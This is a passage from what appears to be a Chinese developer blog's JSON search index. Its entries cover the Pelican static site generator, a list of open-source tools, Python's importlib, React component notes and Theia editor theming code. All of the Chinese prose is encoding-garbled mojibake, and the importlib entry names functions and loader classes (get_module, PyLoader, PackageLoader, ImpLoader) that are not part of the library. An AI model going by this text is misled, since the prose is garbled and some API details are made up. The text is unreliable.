ä¸€ç›´ä½¿ç”¨çš„æ˜¯ Sphinx , ä½†æ˜¯ Sphinx çš„ä¾§é‡ç‚¹åœ¨äº æ•™ç¨‹æ–‡æ¡£çš„ç”Ÿæˆ. è€Œéåšå®¢, è™½ç„¶å ABlog æ‹“å±•å¯ä»¥è®©å…¶çœ‹èµ·æ¥ç±»ä¼¼åšå®¢, ä½†ä¸ªäººä»¥ä¸º, ä¸“ç”¨çš„äº‹å°±äº¤ç»™ä¸“ç”¨çš„æ¡†æ¶å§. æ³¨è§£ å¦ä¸€æ–¹é¢, Sphinx æä¾›çš„åŠŸèƒ½æ¯”è¾ƒå¼ºå¤§, ä½†æ˜¯, è¿ç§»å¾ˆéº»çƒ¦. ä¸€äº›ç›¸å…³èµ„æº: å®˜æ–¹ä»“åº“: https://github.com/getpelican/pelican å®˜æ–¹æ–‡æ¡£(è‹±): https://docs.getpelican.com/en/latest/index.html ç¬¬ä¸‰æ–¹ä¸­æ–‡æ–‡æ¡£: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/publish.html ç®€å•ä½¿ç”¨è§ åˆ›å»ºpelicané¡¹ç›® ä¸»é¢˜ è§ pelicanä¸»é¢˜ æ’ä»¶ è§ pelicanæ’ä»¶ å¼•ç”¨æœ¬åœ°æ–‡æ¡£ Pelicanæä¾›äº†ä¸€ä¸ªç‰¹æ®Šå˜é‡ {filename} ï¼Œ æŒ‡ä»£å½“å‰æ–‡ä»¶çš„è·¯å¾„, æ¯”å¦‚æˆ‘æœ‰ä¸€ä¸ªå¦‚ä¸‹ç»“æ„çš„æ–‡æ¡£: content/æ–‡æ¡£/æ–‡æœ¬æ ‡è®°è¯­è¨€/reStructuredText â”œâ”€â”€ Docutilsæ”¯æŒæŒ‡ä»¤.rst â””â”€â”€ index.rst æˆ‘æƒ³åœ¨ index ä¸­å¼•ç”¨ Docutilsæ”¯æŒæŒ‡ä»¤ , é‚£ä¹ˆè¿™æ ·å†™å³å¯ `å¼•ç”¨çš„è¯´æ˜:Docutilsæ”¯æŒæŒ‡ä»¤ <{filename}./Docutilsæ”¯æŒæŒ‡ä»¤.rst> `_ å‰é¢çš„ å¼•ç”¨çš„è¯´æ˜:Docutilsæ”¯æŒæŒ‡ä»¤ å»ºè®®è‡ªå®šä¹‰åŠ ä¸Š, å¦åˆ™é¡µé¢æ˜¾ç¤ºçš„å°±æ˜¯åé¢çš„çº¯æ–‡æœ¬äº†, ä¸å¥½çœ‹. å¦å¤–å¼•ç”¨çš„æ–‡ä»¶å¿…é¡»å¸¦åç¼€, å¦‚æœåªæ˜¯ `å¼•ç”¨çš„è¯´æ˜:Docutilsæ”¯æŒæŒ‡ä»¤ <{filename}./Docutilsæ”¯æŒæŒ‡ä»¤> `_ (æ— åç¼€)åˆ™æ— æ³•è¯†åˆ«. å¯èƒ½é‡è§çš„é—®é¢˜ è¯„è®º-åˆ†æç»Ÿè®¡æ”¯æŒ","tags":"æ–‡æ¡£","url":"/yq-doc-pelican.html","loc":"/yq-doc-pelican.html"},{"title":"ä¸€äº›å¼€æºä¾¿åˆ©çš„Gité¡¹ç›®","text":"alist æ–‡ä»¶äº‘ç›˜å­˜å‚¨é¡¹ç›®: https://github.com/alist-org/alist/tree/main latest Macç«¯æ›´æ–°è½¯ä»¶å·¥å…·: å®˜ç½‘: https://github.com/mangerlahn/latest è½¯ä»¶æ—è¾¹æœ‰ä¸ªå›¾æ ‡ appStore å›¾æ ‡ è¡¨ç¤ºä» AppStore ä¸‹è½½å®‰è£… å•¤é…’ å›¾æ ‡ è¡¨ç¤ºä» HomeBrew ä¸‹è½½å®‰è£… å°æ˜Ÿæ˜Ÿ å›¾æ ‡ è¡¨ç¤ºä» å®˜ç½‘ ä¸‹è½½å®‰è£… KeyboardShortcuts Macä¸‹ä¸‰æ–¹åº“: https://github.com/sindresorhus/KeyboardShortcuts æ”¯æŒä¾¿æ·çš„å¿«æ·é”®é…ç½®, ä½†æ˜¯ä¸æ”¯æŒé…ç½®çš„å¿«æ·é”®æ‰§è¡Œé»˜è®¤è¡Œä¸º listen1_desktop å¼€æºéŸ³ä¹æ’­æ”¾å™¨, æ¡Œé¢ç‰ˆ https://github.com/listen1/listen1_desktop å®é™…æ ¸å¿ƒæ˜¯ä¸€ä¸ªchromeæ‹“å±•, ç”¨electronåŒ…äº†ä¸€ä¸‹ å®˜ç½‘: https://listen1.github.io/listen1/ frida æ”¯æŒè·¨å¹³å°çš„hook, æ¯”å¦‚ä¾µå…¥åˆ°ä¸€ä¸ªdllå†…æ ¹æ®åç§»è·å–å†…å­˜ä¿¡æ¯ åœ°å€: https://github.com/frida/frida Giteeåœ°å€: https://gitee.com/wenph/frida frida-wechat-sticker åœ°å€: https://github.com/K265/frida-wechat-sticker/tree/main 22å¹´çš„æ—¶å€™å¯ç”¨äºWindowsä¸‹å¾®ä¿¡è¡¨æƒ…åŒ…æå–, ç°åœ¨ä¸çŸ¥é“ amis åœ°å€: https://github.com/baidu/amis ç™¾åº¦å¼€æºä½ä»£ç æ¡†æ¶, å‰ç«¯ healthchecks cron è¿™ç§å®šæ—¶ä»»åŠ¡ç®¡ç†å™¨, æ˜¯ä¸€ä¸ªå¼€æºDjangoé¡¹ç›®, èƒ½åœ¨Crontabå¤±æ•ˆçš„æ—¶å€™é€šçŸ¥ å®˜ç½‘: https://healthchecks.io åœ¨è¿ç»´ä¸­, å½“ä½ çš„Crontabä¸­çš„ä»»åŠ¡æ•°è¶…è¿‡10ä¸ªçš„æ—¶å€™ï¼Œ ä½ ä¼šå‘ç°è¿™äº›ä»»åŠ¡ç®¡ç†èµ·æ¥éå¸¸å›°éš¾ã€‚å°¤å…¶æ˜¯å½“è¿™äº›Cronä»»åŠ¡æ‰§è¡Œå¤±è´¥çš„æ—¶å€™ å…‹éš†: git clone https://github.com/healthchecks/healthchecks.git å®ƒé€šè¿‡ä¸€ä¸ªå›è°ƒæ¥å£åˆ¤æ–­ä½ çš„Crontabä»»åŠ¡æœ‰æ²¡æœ‰é¡ºåˆ©æ‰§è¡Œã€‚ æ¯”å¦‚è¯´ä½ æœ‰ä¸€ä¸ªpythonè„šæœ¬å®šæ—¶æ‰§è¡Œï¼Œhealthchecksç»™å®šçš„å›è°ƒURLæ˜¯: http://localhost:8000/ping/880cb4d åœ¨é…ç½®Crontabè„šæœ¬çš„æ—¶å€™ï¼Œå°±éœ€è¦è¿™ä¹ˆå†™: 8 6 * * * python /home/user/test.py && curl -fsS -m 10 --retry 5 -o /dev/null http://localhost:8000/ping/880cb4d2 å¦‚æœæœªæŒ‰æ—¶è°ƒç”¨å›è°ƒæ¥å£ï¼Œhealthcheckså°†ä¼šé€šè¿‡é‚®ä»¶ç­‰é€šçŸ¥æ–¹å¼å‘Šè­¦ã€‚ hyper ä¸€ä¸ªåŸºäºelectronçš„ç»ˆç«¯å·¥å…·. è·¨å¹³å°. å®˜ç½‘: https://hyper.is github: https://github.com/vercel/hyper furo è§ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/furo å¾…å¤„ç† EMBY ä¸€ä¸ªåª’ä½“æœåŠ¡å™¨, ä»‹ç»å¯çœ‹: https://zhuanlan.zhihu.com/p/629282288","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Some-open-source-and-convenient-GIT-projects.html","loc":"/yq-doc-source-docs-Chaotic-Some-open-source-and-convenient-GIT-projects.html"},{"title":"importlib","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/importlib.html å®ç°äº†importéƒ¨åˆ†åŠŸèƒ½åŠåŠ¨æ€å¯¼å…¥ è¿™é‡Œä»…ä»‹ç»ä¸»è¦çš„å‡ ä¸ª import_module():å¯¼å…¥æ¨¡å—,è¿”å›æ¨¡å—å¯¹è±¡ã€‚ find_loader():æ ¹æ®æ¨¡å—åç§°æŸ¥æ‰¾å…¶åŠ è½½å™¨(loader),ç”¨äºåŠ¨æ€å¯¼å…¥ã€‚ load_module():ä½¿ç”¨åŠ è½½å™¨åŠ è½½æ¨¡å—,è¿”å›æ¨¡å—å¯¹è±¡ã€‚ reload():é‡è½½å·²åŠ è½½çš„æ¨¡å—ã€‚ get_module():æ ¹æ®æ¨¡å—å¯¹è±¡è·å–æ¨¡å—ä¿¡æ¯ã€‚ __import__ æ³¨è§£ ç¨‹åºå¼åœ°å¯¼å…¥æ¨¡å—åº”è¯¥ä½¿ç”¨ import_module() è€Œä¸æ˜¯è¿™ä¸ªå‡½æ•°ã€‚ import_module find_loader invalidate_caches reload metadata metadata.entry_points ä½ç½®: from importlib.metadata import entry_points é€šè¿‡å‚æ•° group æˆ–è€… name, æ‰¾åˆ°æ‰€æœ‰åŒ¹é…çš„å·²å®‰è£…åŒ…çš„å…¥å£. å…³äºloaderåŠ è½½å™¨ åœ¨Pythonçš„importlibåŒ…ä¸­,åŠ è½½å™¨(Loader)æ˜¯ç”¨æ¥åŠ è½½æ¨¡å—çš„å¯¹è±¡ã€‚å®ƒåŒ…å«äº†å¯¼å…¥æ¨¡å—æ‰€éœ€è¦çš„é€»è¾‘å’Œä¿¡æ¯ã€‚ ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§åŠ è½½å™¨: SourceFileLoader:ä»æºæ–‡ä»¶(.pyæ–‡ä»¶)åŠ è½½æ¨¡å—ã€‚ PyLoader:ä»ç¼–è¯‘å¥½çš„æ¨¡å—æ–‡ä»¶(.pycæ–‡ä»¶)åŠ è½½æ¨¡å—ã€‚ PackageLoader:ä»åŒ…ä¸­åŠ è½½å­æ¨¡å—ã€‚ ExtensionFileLoader:ä»æ‰©å±•æ¨¡å—(.so/.pydæ–‡ä»¶)åŠ è½½æ¨¡å—ã€‚ ImpLoader:å…¼å®¹Importæ¨¡å—çš„åŠ è½½å™¨,ç”¨äºä»å·²ç¼–è¯‘å¥½çš„æ¨¡å—åŠ è½½æ¨¡å—ã€‚ ç­‰ç­‰ã€‚ åŠ è½½å™¨å…·æœ‰ä»¥ä¸‹æ–¹æ³•: exec_module(module):æ‰§è¡Œæ¨¡å—çš„æ¨¡å—ä½“ä»£ç ,initializeæ¨¡å—å¯¹è±¡ã€‚ load_module(fullname):åŠ è½½æ¨¡å—,è¿”å›æ¨¡å—å¯¹è±¡ã€‚ get_code(fullname):è·å–æ¨¡å—çš„ä»£ç å¯¹è±¡ã€‚ get_source(fullname):è·å–æ¨¡å—çš„æºä»£ç ã€‚ is_package(fullname):åˆ¤æ–­æ¨¡å—æ˜¯å¦æ˜¯åŒ…ã€‚ get_filename(fullname):è·å–æ¨¡å—çš„æ–‡ä»¶åã€‚ é€šè¿‡è¿™äº›æ–¹æ³•,åŠ è½½å™¨å®ç°äº†å¯¼å…¥æ¨¡å—çš„ä¸»è¦é€»è¾‘ã€‚ ä¾‹å¦‚,SourceFileLoaderå¯ä»¥ä»æºæ–‡ä»¶è¯»å–ä»£ç å¹¶æ‰§è¡Œ,è¿”å›æ¨¡å—å¯¹è±¡ã€‚ åœ¨importlibä¸­,find_loader()å‡½æ•°é€šè¿‡æ¨¡å—åç§°æ‰¾åˆ°ç›¸åº”çš„åŠ è½½å™¨ã€‚ ç„¶åæˆ‘ä»¬å¯ä»¥è°ƒç”¨åŠ è½½å™¨çš„load_module()æ–¹æ³•åŠ è½½è¯¥æ¨¡å—ã€‚ä¾‹å¦‚: import importlib.util name = 'example' loader = importlib.util.find_loader(name) module = loader.load_module(name) è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°exampleæ¨¡å—çš„åŠ è½½å™¨loader,ç„¶åé€šè¿‡loaderåŠ è½½exampleæ¨¡å—,è·å¾—æ¨¡å—å¯¹è±¡moduleã€‚ eg, æ¨¡å—å¯¼å…¥: module = importlib.import_module('math') print(module.sqrt(16)) # 4.0 è·å–æ¨¡å—ä¿¡æ¯: name = 'os' loader = importlib.find_loader(name) module = loader.load_module(name) print(module.__file__) print(module.__package__)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-importlib.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-importlib.html"},{"title":"Pythonæ ‡å‡†åº“","text":".åˆ†ç±» argparse asyncio atexit bdb bisect cmath collections concurrent configparser contextlib contextvars csv ctypes dataclasses datetime decimal dis fileinput fnmatch fractions functools gettext glob heapq hmac html importlib inspect itertools json logging math mmap multiprocessing operator os pelican pip pprint pytz random re resource secrets shutil signal site socket socketserver ssl string struct subprocess sys tarfile tempfile textwrap threading time timeit tkinter traceback types typing unicodedata unittest urllib uuid weakref xml","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-index.html"},{"title":"pelican","text":"é™æ€åšå®¢æ–‡æ¡£ç”Ÿæˆ æ³¨è§£ ä¹‹å‰ä¸€ç›´ç”¨çš„sphinx, è²Œä¼¼æœ€å…¼å®¹çš„æ™®é€šæ–‡æ¡£. å®‰è£…: pip install pelican","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-pelican.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-pelican.html"},{"title":"furo","text":"ä¸€ä¸ªå¼€æºçš„sphinxä¸»é¢˜. é»˜è®¤çš„æ•ˆæœå¤§æ¦‚è¿™æ · å®‰è£…: pip install furo githubåœ°å€: https://github.com/pradyunsg/furo?tab=readme-ov-file æ–‡æ¡£: https://pradyunsg.me/furo/quickstart/","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-furo.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-furo.html"},{"title":"Pythonä¸‰æ–¹åº“","text":"Jinja2 Scrapy aiohttp alive-progress buildozer celery cerberus click clint cryptography ffmpeg frida furo grpc jsonrpc jupyter kivy line_profiler lxml m3u8 maturin memory_profiler nuitka numpy opencv-python outcome pandas pathos pillow playwright progress psutil py2app pySerial pyaml pyinstaller pymysql pyside6 pystack pytest-rerunfailures pytest pytorch pywin32 redis requests rich schedule scikit-learn selenium sphinx-autobuild sphinx tqdm trio xortool yarl","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-index.html"},{"title":"React","text":"å‰ç«¯æ¡†æ¶ React, å®˜æ–¹ä¸­æ–‡: https://zh-hans.react.dev/reference/react hooks é«˜æ€§èƒ½ç»„ä»¶ ä¸€äº›å¥½ç”¨çš„reactåº“ ç»„ä»¶åº“ API é—®é¢˜","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-index.html"},{"title":"å…³äºReactä½¿ç”¨è‡ªå®šä¹‰ç»„ä»¶å´éœ€è¦ä½¿ç”¨çŠ¶æ€","text":"æ‰¾äº†å¾ˆå¤šç§æ–¹æ³•ï¼Œ æœ€ç»ˆåªæœ‰å°†éœ€è¦ä¸€ç§æ–¹æ³•: å°†éœ€è¦ç”¨åˆ°çŠ¶æ€çš„è¿™éƒ¨åˆ†å†…å®¹ï¼Œ åˆ†ç¦»å‡ºå» ï¼Œ è‡³äºå¦‚ä½•åˆ†ç¦»ï¼Œ å¤§è‡´æœ‰ä¸¤ç§æ–¹å¼ å‡½æ•°ç»„ä»¶+HOOP ç»§æ‰¿ React.Component çš„ç±»ç»„ä»¶ï¼Œ ä½¿ç”¨å…¶ä¸­çš„ state ä¸ setState åˆ«æ— å®ƒæ³•ï¼Œ é™¤éä½ åœ¨è‡ªå·±çš„è¿™ä¸ªè‡ªå®šä¹‰ç±»ä¸­å°† React.Component ä¸­çš„ç›¸å…³å†…å®¹é‡å†™ä¸€éï¼Œ å¾ˆéº»çƒ¦","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-About-React-uses-a-custom-component-but-needs-to-be-used.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-About-React-uses-a-custom-component-but-needs-to-be-used.html"},{"title":"reactç›´æ¥æ‰§è¡Œts","text":"ä½¿ç”¨WebStromåˆ›å»ºçš„Reactçš„tsé¡¹ç›®, å‘ç°ä¸éœ€è¦æ‰‹åŠ¨tscç¼–è¯‘å°±å¯ä»¥ç›´æ¥è¿è¡Œ: react-script start åˆ›å»ºæ—¶, è§¦å‘çš„å®é™…æŒ‡ä»¤: /usr/local/bin/npx --yes create-react-app . --template typescript è¿™é‡Œ --yes ` è¡¨ç¤º, è‹¥æœ‰è¯¢é—®, ç›´æ¥ç»™ `yes åé¢ç ”ç©¶äº†ä¸€ä¸‹, å®é™…ä¸Šæ˜¯ç”¨äº† babel çš„ @babel/preset-typescript , è¿™ä¸ªæ¨¡å—é›†æˆäº babel (>=7.0)å†…éƒ¨, åœ¨å¼€å‘æ—¶, å¯ä»¥åœ¨æ‰§è¡Œæ—¶å€™åœ¨å†…å­˜ä¸­ å°†tsè½¬æ¢ä¸ºjs, ä»¥å®ç°ç±»ä¼¼tsç›´æ¥æ‰§è¡Œçš„æ•ˆæœ è§: https://babeljs.io/docs/babel-preset-typescript æ³¨è§£ å¯ä»¥çœ‹åˆ°é¡¹ç›®ç›®å½•ä¸‹æœ‰ä¸ª node_modules/.cache/babel-loader ç›®å½•, ç›¸å…³ç¼“å­˜å°±æ˜¯åœ¨è¿™ä¸‹é¢çš„.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-Perform-the-TS-problem-directly.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Perform-the-TS-problem-directly.html"},{"title":"çˆ¶å­ç»„ä»¶çš„ç›¸äº’è°ƒç”¨","text":"å­ç»„ä»¶è°ƒç”¨çˆ¶ç»„ä»¶çš„æ–¹æ³• è¿™ä¸ªæ¯”è¾ƒç®€å•, çˆ¶ç»„ä»¶è°ƒç”¨å­ç»„ä»¶çš„æ—¶å€™, åƒæ™®é€šä¼ å‚ä¸€æ ·, å°†éœ€è¦è°ƒç”¨çš„æ–¹æ³•ä¼ ç»™å­ç»„ä»¶å³å¯. çˆ¶ç»„ä»¶è°ƒç”¨å­ç»„ä»¶çš„æ–¹æ³• çˆ¶ç»„ä»¶ä½¿ç”¨: render(){ return <Child ref={view => {this._childView = view || undefined}} /> } ç„¶åé€šè¿‡ this._childView è°ƒç”¨å­ç»„ä»¶å³å¯ è¯¦æƒ…å‚è€ƒ: /docs/å‰ç«¯/æ¡†æ¶/react/hooks/createRef","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-The-mutual-call-of-the-father-and-child-component.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-The-mutual-call-of-the-father-and-child-component.html"},{"title":"React é—®é¢˜","text":"refç±»å‹ä¸åŒ¹é… å‡½æ•°ç»„ä»¶æ— refå±æ€§ è°ƒç”¨è‡ªå®šä¹‰å­å‡½æ•°ç»„ä»¶å±æ€§ çˆ¶å­ç»„ä»¶çš„ç›¸äº’è°ƒç”¨ å…³äºReactä½¿ç”¨è‡ªå®šä¹‰ç»„ä»¶å´éœ€è¦ä½¿ç”¨çŠ¶æ€ ç›´æ¥æ‰§è¡Œtsé—®é¢˜","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-index.html"},{"title":"å¤šä¸»é¢˜","text":"ä¸»è¦: node_modules/@theia/core/src/browser/theming.ts ä¸‹å®šä¹‰çš„ ThemeService æœåŠ¡. åœ¨ init æ–¹æ³•ä¸­æ³¨å†Œäº†é»˜è®¤ä¸»é¢˜: protected init(): void { this.register(...BuiltinThemeProvider.themes); ... å¯ä»¥çœ‹åˆ°é»˜è®¤ä¸»é¢˜å®šä¹‰: export class BuiltinThemeProvider { static readonly darkTheme: Theme = { id: 'dark', type: 'dark', label: 'Dark (Theia)', editorTheme: 'dark-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly lightTheme: Theme = { id: 'light', type: 'light', label: 'Light (Theia)', editorTheme: 'light-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly hcTheme: Theme = { id: 'hc-theia', type: 'hc', label: 'High Contrast (Theia)', editorTheme: 'hc-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly hcLightTheme: Theme = { id: 'hc-theia-light', type: 'hcLight', label: 'High Contrast Light (Theia)', editorTheme: 'hc-theia-light' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly themes = [ BuiltinThemeProvider.darkTheme, BuiltinThemeProvider.lightTheme, BuiltinThemeProvider.hcTheme, BuiltinThemeProvider.hcLightTheme ]; } çœ‹æ³¨é‡Š, éƒ½æ˜¯åœ¨ packages/monaco/src/browser/textmate/monaco-theme-registry.ts å®šä¹‰æ³¨å†Œçš„: @injectable() export class MonacoThemeRegistry { @inject(TextmateRegistryFactory) protected readonly registryFactory: TextmateRegistryFactory; initializeDefaultThemes(): void { this.register(require('../../../data/monaco-themes/vscode/dark_theia.json'), { './dark_vs.json': require('../../../data/monaco-themes/vscode/dark_vs.json'), './dark_plus.json': require('../../../data/monaco-themes/vscode/dark_plus.json') }, 'dark-theia', 'vs-dark'); this.register(require('../../../data/monaco-themes/vscode/light_theia.json'), { './light_vs.json': require('../../../data/monaco-themes/vscode/light_vs.json'), './light_plus.json': require('../../../data/monaco-themes/vscode/light_plus.json'), }, 'light-theia', 'vs'); this.register(require('../../../data/monaco-themes/vscode/hc_theia.json'), { './hc_black.json': require('../../../data/monaco-themes/vscode/hc_black.json') }, 'hc-theia', 'hc-black'); this.register(require('../../../data/monaco-themes/vscode/hc_theia_light.json'), { './hc_light.json': require('../../../data/monaco-themes/vscode/hc_light.json') }, 'hc-theia-light', 'hc-light'); } ä»¥ dark_vs.json ä¸ºä¾‹, å…¶ä¸­é¢œè‰²å®šä¹‰ä¸º: { \"$schema\": \"vscode://schemas/color-theme\", \"name\": \"Dark (Visual Studio)\", \"colors\": { \"editor.background\": \"#1E1E1E\", \"editor.foreground\": \"#D4D4D4\", ... å¯ä»¥çœ‹åˆ°é¢œè‰²å®šä¹‰ä¸ºç±»ä¼¼äº: editor.background çš„æ ·å¼, ä½†æ˜¯å®é™…ä½¿ç”¨çš„æ—¶å€™, æ˜¯: --editor-background çš„æ ·å¼, é‚£ä¹ˆæ˜¯åœ¨å“ªé‡Œè½¬æ¢çš„? æœ‰å‡ ä¸ªåœ°æ–¹ theia-coreæ¨¡å—çš„å®šä¹‰1 theia-coreæ¨¡å—çš„å®šä¹‰2 vsçš„editorä¸‹é¢çš„è½¬æ¢ theia-coreæ¨¡å—çš„å®šä¹‰1 è¿™ä¸ªçš„è§¦å‘æ–¹å¼æ˜¯ node_modules/@theia/core/src/browser/color-application-contribution.ts å®šä¹‰çš„äº‹ä»¶: @injectable() export class ColorApplicationContribution implements FrontendApplicationContribution { ... onStart(): void { for (const contribution of this.colorContributions.getContributions()) { contribution.registerColors(this.colors); } this.themeService.initialized.then(() => this.update()); this.themeService.onDidColorThemeChange(() => { this.update(); this.updateThemeBackground(); }); protected update(): void { this.toUpdate.dispose(); this.windows.forEach(win => this.updateWindow(win)); this.onDidChangeEmitter.fire(); } protected updateWindow(win: Window): void { const theme = 'theia-' + this.themeService.getCurrentTheme().type; win.document.body.classList.add(theme); this.toUpdate.push(Disposable.create(() => win.document.body.classList.remove(theme))); const documentElement = win.document.documentElement; if (documentElement) { for (const id of this.colors.getColors()) { const variable = this.colors.getCurrentCssVariable(id); if (variable) { const { name, value } = variable; documentElement.style.setProperty(name, value); this.toUpdate.push(Disposable.create(() => documentElement.style.removeProperty(name))); } } } } } å¦‚ä½•å®ç° åŠ¨æ€å±æ€§åˆ‡æ¢ ä¹Ÿåœ¨è¿™: documentElement.style.setProperty(name, value); è¿™é‡Œä¼šæ‹¿åˆ°CSSå±æ€§å, ä¸å¯¹åº”é¢œè‰²å€¼, ä½¿ç”¨ documentElement.style.setProperty åŠ¨æ€è®¾ç½®è¿›å». å¯ä»¥é€šè¿‡è·Ÿæ–­ç‚¹éªŒè¯è¿™ä¸€ç‚¹. const variable = this.colors.getCurrentCssVariable(id); è°ƒåˆ°çš„æ˜¯ node_modules/@theia/core/src/browser/color-registry.ts çš„ ColorRegistry : @injectable() export class ColorRegistry { getCurrentCssVariable(id: string): ColorCssVariable | undefined { const value = this.getCurrentColor(id); if (!value) { return undefined; } const name = this.toCssVariableName(id); return { name, value }; } toCssVariableName(id: string, prefix = 'theia'): string { return `--${prefix}-${id.replace(/\\./g, '-')}`; } } ç»“è®º ä¼šåœ¨theiaè‡ªå®šä¹‰çš„æ ·å¼å‰åŠ ä¸Š --theia- å‰ç¼€, å¹¶æŠŠ . è½¬æ¢ä¸º - theia-coreæ¨¡å—çš„å®šä¹‰2 è¿™é‡Œä¸»è¦è®²å¦‚ä½•è®² json çš„å†…å®¹å®Œæ•´çš„æ³¨å†Œè¿›å». å¦‚æœæ˜¯ä¸€ä¸ªå®Œå…¨è‡ªå®šä¹‰çš„æ ·å¼å˜é‡, å…‰å†™jsonæ˜¯ä¸è¡Œçš„. ä»¥ä¸‹é¢çš„ä¸¤ä¸ªè‡ªå®šä¹‰é¢œè‰²å˜é‡ä¸ºä¾‹: { \"$schema\": \"vscode://schemas/color-theme\", \"name\": \"Dark (Custom)\", \"colors\": { \"ideC.editor.background\": \"#1E1E1E\", \"ideC.editor.foreground\": \"#D4D4D4\", ... è¿˜éœ€è¦å°†è¿™ä¸ªå˜é‡æ³¨å†Œè¿›å», æ³¨å†Œå®ç°ä½äº node_modules/@theia/core/src/browser/color-application-contribution.ts çš„ ColorContribution è´¡çŒ®ç‚¹çš„ registerColors å³å¯: import {ColorContribution} from \"@theia/core/lib/browser/color-application-contribution\"; import {ColorRegistry} from \"@theia/core/lib/browser/color-registry\"; import {ColorDefinition} from \"@theia/core/src/common/color\"; // \"ideC.editor.background\": \"#1E1E1E\", // \"ideC.editor.foreground\": \"#D4D4D4\", class CustomColor implements ColorContribution{ private customColorID: ColorDefinition[] = [ {id: \"ideC.editor.background\", description: \"color 1\"}, {id: \"ideC.editor.foreground\", description: \"color 2\"}, ] registerColors(colors: ColorRegistry): void { colors.register(...this.customColorID) } } è­¦å‘Š åªæœ‰æ³¨å†Œåˆ°è´¡çŒ®ç‚¹çš„id, æ‰ä¼šå»jsoné‡Œé¢æ‰¾ ä¸»è¦æ˜¯è°ƒç”¨çš„ node_modules/@theia/monaco-editor-core/src/vs/platform/theme/common/colorRegistry.ts`ä¸‹ `ColorRegistry çš„ registerColor . å¯ä»¥ç†è§£è¿™ä¸ª ColorRegistry() æ˜¯ä¸€ä¸ªç¼“å­˜, jsoné‡Œé¢çš„é…ç½®ä¼šå…ˆè¯»åˆ°è¿™é‡Œ, ç„¶ååœ¨ theia-coreæ¨¡å—çš„å®šä¹‰1 ä¸­éœ€è¦ documentElement.style.setProperty çš„æ—¶å€™å†ä»è¿™ä¸ªç¼“å­˜é‡Œè¯». vsçš„editorä¸‹é¢çš„è½¬æ¢ ä¸»è¦æ–‡ä»¶: node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneThemeService.ts ä½äº node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneThemeService.ts ä¸‹ StandaloneThemeService çš„ _updateThemeOrColorMap const colorVariables: string[] = []; for (const item of colorRegistry.getColors()) { const color = this._theme.getColor(item.id, true); if (color) { colorVariables.push(`${asCssVariableName(item.id)}: ${color.toString()};`); } } ä¸»è¦æ˜¯ asCssVariableName , çœ‹çœ‹å®ƒçš„å®šä¹‰: export function asCssVariableName(colorIdent: ColorIdentifier): string { return `--vscode-${colorIdent.replace(/\\./g, '-')}`; } ç»“è®º ä¼šåœ¨vscodeçš„æ ·å¼å‰åŠ ä¸Š --vscode- å‰ç¼€, å¹¶æŠŠ . è½¬æ¢ä¸º - é‚£ä¹ˆvscodeçš„ä¸»é¢˜æ˜¯æ€ä¹ˆå®ç°åŠ¨æ€è®¾ç½®çš„å‘¢? åœ¨ node_modules/@theia/monaco-editor-core/src/vs/editor/browser/editorDom.ts ä¸‹çš„ RefCountedCssRule class RefCountedCssRule { private _referenceCount: number = 0; private _styleElement: HTMLStyleElement; constructor( public readonly key: string, public readonly className: string, _containerElement: HTMLElement | undefined, public readonly properties: CssProperties, ) { this._styleElement = dom.createStyleSheet( _containerElement ); this._styleElement.textContent = this.getCssText(this.className, this.properties); } private getCssText(className: string, properties: CssProperties): string { let str = `.${className} {`; for (const prop in properties) { const value = (properties as any)[prop] as string | ThemeColor; let cssValue; if (typeof value === 'object') { cssValue = `var(${asCssVariableName(value.id)})`; } else { cssValue = value; } const cssPropName = camelToDashes(prop); str += `\\n\\t${cssPropName}: ${cssValue};`; } str += `\\n}`; return str; } public dispose(): void { this._styleElement.remove(); } ... } å…¶ä¸­ getCssText å°±æ˜¯æ‹¿åˆ°ä¸Šé¢æ‰€è¯´çš„æ‰€æœ‰è½¬æ¢vsçš„æ ·å¼å­—ç¬¦ä¸², ä¸»è¦çœ‹ ä½äº node_modules/@theia/monaco-editor-core/src/vs/base/browser/dom.ts çš„ _styleElement çš„åˆ›å»º: export function createStyleSheet(container: HTMLElement = document.getElementsByTagName('head')[0]): HTMLStyleElement { const style = document.createElement('style'); style.type = 'text/css'; style.media = 'screen'; container.appendChild(style); return style; } ä¸theiaä¸åŒ, å®ƒæ˜¯ç›´æ¥ç”Ÿæˆä¸€ä¸ªstyleç„¶åå†™è¿›å». é¢œè‰²ä¸ä¸»é¢˜åŒºåˆ« ä¸»é¢˜æ³¨å†Œä¸åˆ‡æ¢åŸºæœ¬æ˜¯é€šè¿‡ 